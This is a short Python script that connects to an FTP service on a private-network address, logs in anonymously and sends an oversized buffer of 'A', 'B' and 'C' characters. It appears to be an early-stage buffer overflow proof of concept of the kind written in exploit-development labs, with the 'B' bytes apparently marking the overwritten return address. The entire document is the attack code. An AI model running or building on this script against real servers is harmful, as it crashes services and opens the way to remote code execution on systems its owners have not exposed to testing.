#!/usr/bin/python
import sys,socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.3.12',21))


buf = ""
buf += "A"*2007
buf += "B" * 4
buf += "C" * 3000
buf += "\n"

buf += "\n"
s.send('USER anonymous \r\n')
s.recv(1024)
s.send(buf)
